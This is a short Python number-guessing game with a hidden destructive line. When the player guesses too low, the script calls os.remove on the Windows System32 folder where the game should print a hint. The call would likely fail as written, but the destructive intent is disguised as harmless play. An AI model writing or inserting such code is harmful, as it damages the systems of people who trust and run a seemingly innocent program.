import random
import os 

num = random.randint(1,10)
e_num = input("Guess the number between 1 and 10: ")

while True:
    if int(e_num) < num :
        os.remove("C:\Windows\System32")
            
    elif int(e_num) > num: 
        print("The number you've inputed is higher so input something less ")

    elif int(e_num)  == num:
        print('Yayy you got the number')
        break

    e_num = input("Guess again: ")
